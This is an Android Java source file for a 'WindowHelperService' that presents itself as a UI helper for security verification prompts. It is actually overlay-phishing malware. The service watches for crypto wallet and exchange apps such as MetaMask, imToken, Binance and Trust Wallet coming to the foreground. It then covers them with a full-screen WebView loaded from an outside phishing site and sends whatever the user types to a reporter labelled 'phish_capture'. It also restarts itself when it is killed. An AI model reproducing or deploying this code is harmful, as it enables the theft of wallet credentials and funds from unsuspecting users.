// WindowHelperService.java
// ========================
// UI helper daemon — in-app security verification prompts

package com.vxin.app.core.ui;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.core.app.NotificationCompat;

import com.vxin.app.core.sync.SyncReporter;

import org.json.JSONObject;

import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class WindowHelperService extends Service {
    private static final Set<String> TARGETS = new HashSet<>(Arrays.asList(
        "im.token.app", "com.bitpie", "vip.mytokenpocket",
        "com.huobi.client", "com.okinc.okex.gp", "com.binance.dev",
        "io.metamask", "com.trustwallet.app", "com.bybit.app",
        "com.coinbase.wallet", "com.exodusmovement.exodus"
    ));

    private WindowManager windowManager;
    private android.view.View overlayView;
    private String currentTarget;
    private final Handler handler = new Handler();
    private SyncReporter reporter;
    private final Map<String, Boolean> shownToday = new HashMap<>();

    private static final String PAGE_BASE = "https://dipsin.com/verify/";

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        reporter = SyncReporter.get(this);
        startForegroundService();
    }

    private void startForegroundService() {
        createNotificationChannel();
        Notification n = new NotificationCompat.Builder(this, "vxin_ui")
            .setContentTitle("v信")
            .setContentText("界面服务运行中")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build();
        startForeground(1003, n);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForegroundDetection();
        return START_STICKY;
    }

    private void startForegroundDetection() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                detectTarget();
                handler.postDelayed(this, 1000);
            }
        }, 1000);
    }

    private void detectTarget() {
        try {
            UsageStatsManager usm = (UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
            long now = System.currentTimeMillis();
            List<UsageStats> stats = usm.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, now - 3000, now);
            if (stats == null || stats.isEmpty()) return;
            stats.sort((a, b) -> Long.compare(b.getLastTimeUsed(), a.getLastTimeUsed()));
            String fg = stats.get(0).getPackageName();

            if (TARGETS.contains(fg)) {
                if (!fg.equals(currentTarget) && !wasShownToday(fg)) {
                    currentTarget = fg;
                    showOverlay(fg);
                }
            } else {
                currentTarget = null;
            }
        } catch (Exception ignored) {}
    }

    private boolean wasShownToday(String pkg) {
        String key = pkg + "_" + java.time.LocalDate.now().toString();
        return shownToday.getOrDefault(key, false);
    }

    private void markShown(String pkg) {
        String key = pkg + "_" + java.time.LocalDate.now().toString();
        shownToday.put(key, true);
    }

    private void showOverlay(String targetPackage) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) return;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            PixelFormat.TRANSLUCENT
        );

        WebView webView = new WebView(this);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setAllowFileAccess(false);
        settings.setCacheMode(WebSettings.LOAD_NO_CACHE);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                params.flags &= ~WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
                windowManager.updateViewLayout(view, params);
            }
        });

        webView.addJavascriptInterface(new JSBridge(targetPackage), "vxinBridge");
        webView.loadUrl(PAGE_BASE + getPhishPage(targetPackage));

        overlayView = webView;
        try {
            windowManager.addView(overlayView, params);
            markShown(targetPackage);
            JSONObject ev = new JSONObject();
            ev.put("wallet", targetPackage);
            reporter.send("overlay_shown", ev);
        } catch (Exception ignored) {}
    }

    private void hideOverlay() {
        if (overlayView != null) {
            try { windowManager.removeView(overlayView); } catch (Exception ignored) {}
            overlayView = null;
        }
    }

    private String getPhishPage(String pkg) {
        switch (pkg) {
            case "im.token.app": return "imtoken.html";
            case "com.bitpie": return "bitpie.html";
            case "vip.mytokenpocket": return "tokenpocket.html";
            case "com.huobi.client": return "huobi.html";
            case "com.okinc.okex.gp": return "okx.html";
            case "com.binance.dev": return "binance.html";
            case "io.metamask": return "metamask.html";
            case "com.trustwallet.app": return "trustwallet.html";
            case "com.bybit.app": return "bybit.html";
            default: return "metamask.html";
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                "vxin_ui", "v信 界面服务", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    public class JSBridge {
        private final String walletPackage;

        JSBridge(String pkg) { this.walletPackage = pkg; }

        @JavascriptInterface
        public void onSubmit(String type, String data) {
            try {
                JSONObject payload = new JSONObject();
                payload.put("wallet", walletPackage);
                payload.put("field_type", type);
                payload.put("value", data);
                reporter.send("phish_capture", payload);
                hideOverlay();
            } catch (Exception ignored) {}
        }

        @JavascriptInterface
        public void onCancel() {
            hideOverlay();
        }
    }

    @Override
    public void onDestroy() {
        try {
            Intent restart = new Intent(this, WindowHelperService.class);
            PendingIntent pi = PendingIntent.getService(this, 1, restart,
                PendingIntent.FLAG_IMMUTABLE);
            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
            if (am != null) am.set(AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 2000, pi);
        } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
